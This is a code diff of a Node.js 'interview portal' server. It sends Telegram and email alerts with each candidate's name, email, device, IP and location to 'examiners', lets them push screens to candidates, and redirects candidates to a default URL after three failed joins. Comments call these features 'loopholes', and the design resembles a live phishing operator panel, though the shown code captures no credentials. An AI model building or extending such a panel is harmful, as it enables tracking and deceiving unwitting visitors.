@@ -63,46 +63,50 @@ app.use(gatewayCheck);
 /**
  * LOOPHOLE 1: DUAL NOTIFICATION SYSTEM
  */
-async function notifyExaminers(candidateEmail, categoryName) {
-    // Fetch full candidate details for the email body
+async function notifyExaminers(candidateEmail, categoryName, attemptCount = 1) {
+    console.log(`[DEBUG] Starting notification broadcast for ${candidateEmail} (Attempt: ${attemptCount})`);
+
+    // Fetch candidate details first
     db.get(`SELECT * FROM candidates WHERE email = ?`, [candidateEmail], (err, candidate) => {
-        if (err || !candidate) return;
+        if (err || !candidate) {
+            console.log(`[DEBUG] Notification aborted: Candidate ${candidateEmail} not found in DB.`);
+            return;
+        }
 
         const dateStr = new Date().toLocaleString();
         const emailContent = `
-            🔔 NEW CANDIDATE LOGGED IN
+            🔔 NEW CANDIDATE LOGGED IN (Attempt ${attemptCount}/3)
             --------------------------------
-            ID: ${candidate.id}
             Name: ${candidate.name}
             Email: ${candidate.email}
             Category: ${categoryName}
-            
-            DEVICE & NETWORK:
             Device: ${candidate.device_info || 'Unknown'}
             IP: ${candidate.ip_address || 'Hidden'}
-            
-            LOCATION:
-            Location: ${candidate.city || 'Unknown City'}, ${candidate.country || 'Unknown Country'}
-            
-            TIME:
-            Date: ${dateStr}
+            Location: ${candidate.city || 'Unknown'}, ${candidate.country || 'Unknown'}
+            Time: ${dateStr}
             --------------------------------
         `;
 
-        const telegramMsg = `🔔 New Candidate: ${candidate.name}\n💼 Category: ${categoryName}`;
+        const telegramMsg = `🔔 [Attempt ${attemptCount}] New Candidate: ${candidate.name}\n💼 Category: ${categoryName}\n📧 Email: ${candidate.email}`;
 
-        db.get(`SELECT * FROM mailer_settings WHERE is_active = 1`, [], (err, smtp) => {
-            db.all(`SELECT telegram_key, chat_id, email FROM examiners WHERE status = 1`, [], (err, examiners) => {
+        // Get Active SMTP Settings
+        db.get(`SELECT * FROM mailer_settings`, [], (err, smtp) => {
+            if (!smtp) console.log("[DEBUG] Email Notification Skipped: No active SMTP settings.");
+
+            // Broadcast to ALL examiners (Broadcasting requirement)
+            db.all(`SELECT telegram_key, chat_id, email FROM examiners`, [], (err, examiners) => {
                 if (err || !examiners) return;
 
                 examiners.forEach(ex => {
-                    // 1. Telegram Notification
+                    // 1. Telegram Broadcast
                     if (ex.telegram_key && ex.chat_id) {
                         const url = `https://api.telegram.org/bot${ex.telegram_key}/sendMessage?chat_id=${ex.chat_id}&text=${encodeURIComponent(telegramMsg)}`;
-                        https.get(url).on('error', (e) => console.error("Telegram Fail:", e.message));
+                        https.get(url, (res) => {
+                            if (res.statusCode !== 200) console.log(`[DEBUG] Telegram failed for chat_id ${ex.chat_id}. Status: ${res.statusCode}`);
+                        }).on('error', (e) => console.error("[DEBUG] Telegram Network Error:", e.message));
                     }
 
-                    // 2. Email Notification (Point 2 & 3)
+                    // 2. Email Broadcast
                     if (ex.email && smtp) {
                         let transporter = nodemailer.createTransport({
                             host: smtp.host,
@@ -114,14 +118,9 @@ async function notifyExaminers(candidateEmail, categoryName) {
                         transporter.sendMail({
                             from: smtp.from_email,
                             to: ex.email,
-                            subject: `Interview Alert: ${candidate.name} (${categoryName})`,
+                            subject: `Broadcast Alert: ${candidate.name}`,
                             text: emailContent
-                        }).catch(e => {
-                            // POINT 3: Debug logging for email failures
-                            console.log("CRITICAL EMAIL ERROR:", e.message);
-                            console.log("Attempted SMTP User:", smtp.user);
-                            console.log("Target Examiner Email:", ex.email);
-                        });
+                        }).catch(e => console.log(`[DEBUG] Email failed for ${ex.email}:`, e.message));
                     }
                 });
             });
@@ -144,52 +143,96 @@ io.on('connection', (socket) => {
      */
     socket.on('join_interview', async (data) => {
         const { name, email, categoryId } = data;
-        
-        // LOOPHOLE 2: Check for Online Examiners
-        db.get(`SELECT COUNT(*) as activeCount FROM examiners WHERE status = 1`, [], (err, row) => {
-            if (!row || row.activeCount === 0) {
-                joinAttempts[email] = (joinAttempts[email] || 0) + 1;
-                
-                if (joinAttempts[email] > 3) {
-                    // Redirect to default category URL after 3 fails
-                    db.get(`SELECT default_redirect_url FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
-                        socket.emit('redirect_command', { url: cat ? cat.default_redirect_url : '/' });
-                        delete joinAttempts[email];
-                    });
-                    return;
-                }
-                // Notify examiners anyway (in case they forgot to toggle) and tell candidate to retry
-                notifyExaminers(name, "WAITING - " + (joinAttempts[email]));
-                socket.emit('retry_connection', { attempt: joinAttempts[email] });
+
+        // 1. DATABASE SAVE/UPDATE (UPSERT)
+        // Ensures candidate exists and is marked 'live' before checking examiners
+        const upsertSql = `
+            INSERT INTO candidates (email, name, category_id, status) 
+            VALUES (?, ?, ?, 'live') 
+            ON CONFLICT(email) DO UPDATE SET 
+            status = 'live', 
+            category_id = EXCLUDED.category_id,
+            name = EXCLUDED.name
+        `;
+
+        db.run(upsertSql, [email, name, categoryId], function(err) {
+            if (err) {
+                console.error("[DEBUG] DB Error during join:", err.message);
                 return;
             }
 
-            // Normal Joining Logic (from your original file)
-            emailToSocket[email] = socket.id;
-            socket.email = email;
-            joinAttempts[email] = 0;
+            // 2. BROADCAST NOTIFICATION
+            // Requirement: Notify examiners immediately when a candidate joins
+            const currentAttempt = (joinAttempts[email] || 0) + 1;
+            db.get(`SELECT name FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
+                const catName = cat ? cat.name : 'General';
+                console.log(`[DEBUG] Broadcasting join for ${name} (Attempt ${currentAttempt})`);
+                notifyExaminers(email, catName, currentAttempt);
+            });
 
-            db.run(`UPDATE candidates SET status = 'live' WHERE email = ?`, [email], () => {
-                db.get(`SELECT * FROM candidates WHERE email = ?`, [email], (err, candidate) => {
-                    if (candidate) {
-                        db.all(`SELECT * FROM interactions WHERE candidate_email = ? ORDER BY timestamp ASC`, [email], (err, history) => {
-                            socket.emit('restore_session', { candidate, history });
-                            db.get(`SELECT name FROM categories WHERE id = ?`, [candidate.category_id], (err, cat) => {
-                                io.emit('candidate_online', { ...candidate, status: 'live', category_name: cat ? cat.name : 'General' });
-                            });
+            // 3. EXAMINER AVAILABILITY CHECK
+            db.get(`SELECT COUNT(*) as activeCount FROM examiners WHERE status = 1`, [], (err, row) => {
+                const examinersOnline = row && row.activeCount > 0;
+
+                if (!examinersOnline) {
+                    // NO EXAMINER ONLINE: Incremental Retry Logic
+                    joinAttempts[email] = currentAttempt;
+                    console.log(`[DEBUG] No examiner online for ${email}. Handling attempt ${currentAttempt}/3`);
+
+                    if (joinAttempts[email] >= 3) {
+                        // REACHED 3 ATTEMPTS: Redirect to Category Default URL
+                        db.get(`SELECT default_redirect_url FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
+                            const targetUrl = cat ? cat.default_redirect_url : '/';
+                            console.log(`[DEBUG] Final failure for ${email}. Redirecting to: ${targetUrl}`);
+                            socket.emit('redirect_command', { url: targetUrl });
+                            delete joinAttempts[email];
                         });
                     } else {
-                        db.run(`INSERT INTO candidates (email, name, category_id, status) VALUES (?, ?, ?, 'live')`, 
-                            [email, name, categoryId], function() {
-                            db.get(`SELECT file_path FROM screens WHERE category_id = ? AND is_default = 1`, [categoryId], (err, screen) => {
-                                if (screen) socket.emit('new_task', { screenFile: screen.file_path, header: "Welcome", subHeader: "Please begin." });
-                            });
-                            db.get(`SELECT name FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
-                                notifyExaminers(name, cat ? cat.name : 'General');
-                                io.emit('candidate_online', { email, name, category_id: categoryId, status: 'live', category_name: cat ? cat.name : 'General' });
-                            });
+                        console.log(`[DEBUG] No examiner online. Sending failure to client. Attempt: ${currentAttempt}`);
+        
+                        // We emit 'join_failed' instead of a silent 'retry_connection'
+                        socket.emit('join_failed', { 
+                            message: "No examiners are currently available to start your session. Please try joining again.",
+                            attempt: joinAttempts[email]
                         });
                     }
+                    return; 
+                }
+
+                // 4. EXAMINER IS ONLINE: Proceed with portal session
+                console.log(`[DEBUG] Examiner found. Initializing session for ${email}`);
+                emailToSocket[email] = socket.id;
+                socket.email = email;
+                joinAttempts[email] = 0; // Reset attempts on successful connection
+
+                // Fetch history and current state
+                db.all(`SELECT * FROM interactions WHERE candidate_email = ? ORDER BY timestamp ASC`, [email], (err, history) => {
+                    db.get(`SELECT * FROM candidates WHERE email = ?`, [email], (err, candidate) => {
+                        // Restore existing session
+                        socket.emit('restore_session', { candidate, history });
+
+                        // If it's a fresh session (no history), send the default screen
+                        if (!history || history.length === 0) {
+                            db.get(`SELECT file_path FROM screens WHERE category_id = ? AND is_default = 1`, [categoryId], (err, screen) => {
+                                if (screen) {
+                                    socket.emit('new_task', { 
+                                        screenFile: screen.file_path, 
+                                        header: "Welcome", 
+                                        subHeader: "Please begin the process." 
+                                    });
+                                }
+                            });
+                        }
+
+                        // Alert examiners that the candidate is now truly "Live" in the portal
+                        db.get(`SELECT name FROM categories WHERE id = ?`, [candidate.category_id], (err, cat) => {
+                            io.emit('candidate_online', { 
+                                ...candidate, 
+                                status: 'live', 
+                                category_name: cat ? cat.name : 'General' 
+                            });
+                        });
+                    });
                 });
             });
         });
